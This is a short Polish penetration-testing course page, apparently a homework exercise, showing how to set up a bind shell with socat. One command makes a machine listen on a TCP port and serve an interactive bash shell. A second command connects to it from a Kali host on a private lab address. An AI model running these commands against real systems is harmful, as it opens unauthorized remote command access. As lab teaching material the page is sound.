---
title: "6.7 - Bind shell przez socat"
order: 7
---

```bash
#Remote Shells HOMEWORK (terminal 1):
socat TCP-LISTEN:32103,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

#Kali (terminal 2):
socat FILE:`tty`,raw,echo=0 TCP:192.168.100.106:32103
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw06/cw06_p.md).
